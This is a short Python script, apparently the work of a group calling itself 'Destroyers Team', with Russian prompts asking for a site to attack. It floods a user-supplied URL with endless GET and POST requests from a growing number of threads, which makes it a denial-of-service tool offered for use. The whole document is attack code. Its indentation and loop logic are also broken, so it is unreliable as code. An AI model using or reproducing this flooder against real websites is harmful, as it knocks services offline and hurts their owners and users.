import threading
import requests
import random	# For Random source port
import time
from threading import Thread

print("🅳🅴🆂🆃🆁🅾🆈🅴🆁🆂 🆃🅴🅰🅼")

targ = input("Введите ссылку на сайт для атаки: ")
thrnom = input('Threads: ')

def ddos():
 while True:
  spam = requests.post(targ)
  spam2 = requests.get(targ)
  print("[+] Заход на сайт выполнен!")
 for i in range(int(thrnom)):
 thr = Thread(target = ddos) 
while True:
 threading.Thread(target=ddos).start()
 print('DDOS is running...')
